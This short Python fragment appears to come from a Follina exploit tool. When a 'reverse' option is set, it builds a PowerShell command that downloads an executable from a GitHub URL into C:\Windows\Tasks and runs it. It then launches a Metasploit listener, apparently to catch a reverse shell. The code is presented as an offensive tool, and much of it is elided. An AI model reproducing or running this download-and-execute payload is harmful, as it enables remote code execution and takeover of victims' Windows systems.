...
def main(args):
    ...
    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/Cruzalexandar/Follina/blob/master/advanced3.exe?raw=true -OutFile C:\\Windows\\Tasks\\advanced3.exe; C:\\Windows\\Tasks\\advanced3.exe"""
    ...
    if args.reverse:
        ...
        os.system(f"msfconsole -r listener.rc")
